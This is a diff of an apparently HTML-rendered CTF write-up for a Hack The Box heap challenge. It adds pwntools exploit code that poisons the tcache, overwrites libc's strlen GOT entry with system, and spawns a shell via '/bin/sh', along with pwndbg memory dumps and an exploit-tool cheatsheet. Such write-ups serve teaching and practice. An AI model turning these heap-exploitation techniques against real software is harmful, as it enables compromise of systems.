+</span></span><span class="line"><span class="cl"><span class="c1"># So, the best place is to set the chunk address to GOT - 0x18 </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">heap_base</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x1f2098</span><span class="o">-</span><span class="mh">0x18</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x20001</span><span class="p">),</span> <span class="n">key</span><span class="p">(</span><span class="mh">0x30001</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000001	0x6262626262626262 &lt;- main_chunk
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x0000000000000000	0x0000000000000051
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x00007fa90e29f173	0x370a42ea29d203d9 &lt;- poisoned_chunk
+</span></span><span class="line"><span class="cl">0x561b6d1f3350:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3360:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3370:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; bins
+</span></span><span class="line"><span class="cl">tcachebins
+</span></span><span class="line"><span class="cl">0x20 [ 52]: 0x0
+</span></span><span class="line"><span class="cl">0x30 [  0]: 0x561b7d1f3
+</span></span><span class="line"><span class="cl">0x50 [  2]: 0x561b6d1f3340 —▸ 0x7fac6f9f2080 (*ABS*@got.plt) ◂— 0x7fab95513ed2
+</span></span><span class="line"><span class="cl">0xa0 [  7]: 0x0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, the <code>tcache[0x50]</code> is now pointing to the <code>strlen</code> GOT-0x18. Now, we just need to allocate two more chunks, and the second chunk will be placed in the <code>strlen</code> GOT-0x18.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Allocate /bin/sh\x00. We will call puts to this chunk later</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, next allocation will be placed in strlen GOT-0x18</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite strlen GOT in libc with system</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># __wmemcmp_avx2_movbe + _dl_find_dso_for_object@got.plt + __strncpy_avx2 + system</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x2c0f0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x17a780</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x21</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; tele 0x7fac6f9f2000 25
+</span></span><span class="line"><span class="cl">00:0000│  0x7fac6f9f2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f1bc0
+</span></span><span class="line"><span class="cl">01:0008│  0x7fac6f9f2008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fac6fb62000 —▸ 0x7fac6f800000 ◂— 0x3010102464c457f
+</span></span><span class="line"><span class="cl">02:0010│  0x7fac6f9f2010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fac6fb7b2c0 (_dl_runtime_resolve_xsavec) ◂— endbr64 
+</span></span><span class="line"><span class="cl">03:0018│  0x7fac6f9f2018 (*ABS*@got.plt) —▸ 0x7fac6f9790a0 (__strnlen_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">04:0020│  0x7fac6f9f2020 (*ABS*@got.plt) —▸ 0x7fac6f974f50 (__rawmemchr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">05:0028│  0x7fac6f9f2028 (realloc@got[plt]) —▸ 0x7fac6f82c030 ◂— endbr64 
+</span></span><span class="line"><span class="cl">06:0030│  0x7fac6f9f2030 (*ABS*@got.plt) —▸ 0x7fac6f976f00 (__strncasecmp_avx) ◂— endbr64 
+</span></span><span class="line"><span class="cl">07:0038│  0x7fac6f9f2038 (_dl_exception_create@got.plt) —▸ 0x7fac6f82c050 ◂— endbr64 
+</span></span><span class="line"><span class="cl">08:0040│  0x7fac6f9f2040 (*ABS*@got.plt) —▸ 0x7fac6f97bea0 (__mempcpy_avx_unaligned_erms) ◂— endbr64 
+</span></span><span class="line"><span class="cl">09:0048│  0x7fac6f9f2048 (*ABS*@got.plt) —▸ 0x7fac6f97c560 (__wmemset_avx2_unaligned) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0a:0050│  0x7fac6f9f2050 (calloc@got[plt]) —▸ 0x7fac6f82c080 ◂— endbr64 
+</span></span><span class="line"><span class="cl">0b:0058│  0x7fac6f9f2058 (*ABS*@got.plt) —▸ 0x7fac6f9741c0 (__strspn_sse42) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0c:0060│  0x7fac6f9f2060 (*ABS*@got.plt) —▸ 0x7fac6f974c80 (__memchr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0d:0068│  0x7fac6f9f2068 (*ABS*@got.plt) —▸ 0x7fac6f97bec0 (__memmove_avx_unaligned_erms) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0e:0070│  0x7fac6f9f2070 (*ABS*@got.plt) —▸ 0x7fac6f97cb20 (__wmemchr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0f:0078│  0x7fac6f9f2078 (*ABS*@got.plt) —▸ 0x7fac6f97b0e0 (__stpcpy_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">10:0080│  0x7fac6f9f2080 (*ABS*@got.plt) —▸ 0x7fac6f970021 (__strncmp_sse42+3137) ◂— sub ebx, 0x10
+</span></span><span class="line"><span class="cl">11:0088│  0x7fac6f9f2088 (_dl_find_dso_for_object@got.plt) —▸ 0x7fac6f82c0f0 ◂— endbr64 
+</span></span><span class="line"><span class="cl">12:0090│  0x7fac6f9f2090 (*ABS*@got.plt) —▸ 0x7fac6f97a780 (__strncpy_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">13:0098│  0x7fac6f9f2098 (*ABS*@got.plt) —▸ 0x7fac6f84e320 (system) ◂— endbr64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have successfully overwritten the <code>strlen</code> GOT to system. Now, we just need to call <code>puts()</code> to the hashmap entry with key <code>0x38</code> to get a shell :).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Now, calling puts will call system as well, which means</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># puts(&#39;/bin/sh&#39;) will be hijacked to system(&#39;/bin/sh&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">)</span> <span class="c1"># Call puts</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># We got shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.imgur.com/QRyFgIj.png"
+        data-srcset="https://i.imgur.com/QRyFgIj.png, https://i.imgur.com/QRyFgIj.png 1.5x, https://i.imgur.com/QRyFgIj.png 2x"
+        data-sizes="auto"
+        alt="https://i.imgur.com/QRyFgIj.png"
+        title="https://i.imgur.com/QRyFgIj.png" /></p>
+<h4 id="full-script-6">Full Script</h4>
+<p>Below is my full script:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
@@ -4624,9 +6210,89 @@
 </span><span class="lnt">231
 </span><span class="lnt">232
 </span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">Cheatsheet:
+</span></span></span><span class="line"><span class="cl"><span class="s1">one_gadget &lt;libc_file&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">ROPgadget --binary &lt;binary_file&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">readelf -s &lt;libc_file&gt; | grep &lt;something&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">readelf --sections &lt;binary_file&gt; | egrep &#34;Name|.rela.plt|.dynsym|.dynstr&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">rsactftool -n &lt;modulus&gt; -e &lt;exponent&gt; --private
+</span></span></span><span class="line"><span class="cl"><span class="s1">pwninit &lt;- patch ELF with the correct libc
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">libc = ELF(libc_path)
+</span></span></span><span class="line"><span class="cl"><span class="s1">read_got = exe.got[&#39;read&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">read_plt = exe.plt[&#39;read&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">libc_system = libc.symbols[&#39;system&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">bin_sh_string_addr = next(libc.search(b&#39;/bin/sh&#39;))
+</span></span></span><span class="line"><span class="cl"><span class="s1">bss = elf.bss()
+</span></span></span><span class="line"><span class="cl"><span class="s1">sc = asm(shellcraft.amd64.linux.sh())
+</span></span></span><span class="line"><span class="cl"><span class="s1">libcdb.unstrip_libc(&#39;./libc-2.31.so&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">from pwn import *
+</span></span></span><span class="line"><span class="cl"><span class="s1">kernel = ELF(&#39;./vmlinux&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">hex(next(kernel.search(b&#39;/sbin/modprobe</span><span class="se">\0</span><span class="s1">&#39;)))
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">unsorted_bin &gt; fastbin
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">pub = RSA.importKey(open(&#34;pub.pem&#34;, &#34;rb&#34;).read(), passphrase=None)
+</span></span></span><span class="line"><span class="cl"><span class="s1">e = pub.e
+</span></span></span><span class="line"><span class="cl"><span class="s1">n = pub.n
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span><span class="p">,</span> <span class="n">PKCS1_OAEP</span><span class="p">,</span> <span class="n">PKCS1_v1_5</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA3_256</span><span class="p">,</span> <span class="n">HMAC</span><span class="p">,</span> <span class="n">BLAKE2s</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">glob</span><span class="o">,</span> <span class="nn">gmpy2</span><span class="o">,</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">itertools</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">math</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">binascii</span><span class="o">,</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">datetime</span><span class="o">,</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;runic_patched&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
@@ -4637,8 +6303,8 @@
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;209.97.134.50&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">32143</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;165.232.98.11&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">30688</span>
 </span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
 </span></span><span class="line"><span class="cl">
@@ -4820,12 +6486,16 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># Poison the tcache again just like before, but instead of</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># forging the entry to tcache_perthread_struct, forge it to</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># strlen GOT - 0x10 in libc.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># strlen GOT - 0x18 in libc.</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Setup the tcache[0x50]</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1"># Remember that this is our poison_chunk</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Remember that this allocation will still be placed in the exact same address as </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># our poisoned_chunk (which is adjacent to the main_chunk). The reason is because </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># there isn&#39;t any tcache[0x50] entries yet, so this allocation will take a place in </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the unsorted bin chunk address, which is still adjacent to our main_chunk.</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x22</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x22</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">))</span> <span class="c1"># Now, as usual, poison_chunk contains address to heap chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">))</span> <span class="c1"># Now, as usual, poisoned_chunk contains address to heap chunk</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># Overwrite it to strlen GOT - 0x18</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># We can&#39;t set it directly to strlen GOT because:</span>
@@ -4861,15 +6531,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://i.imgur.com/QRyFgIj.png"
-        data-srcset="https://i.imgur.com/QRyFgIj.png, https://i.imgur.com/QRyFgIj.png 1.5x, https://i.imgur.com/QRyFgIj.png 2x"
-        data-sizes="auto"
-        alt="https://i.imgur.com/QRyFgIj.png"
-        title="https://i.imgur.com/QRyFgIj.png" /></p>
-<blockquote>
+</div><blockquote>
 <p><strong>Flag: HTB{k1ng_0f_h4sh1n_4nd_m4st3r_0f_th3_run3s}</strong></p>
 </blockquote>
 <h1 id="social-media">Social Media</h1>
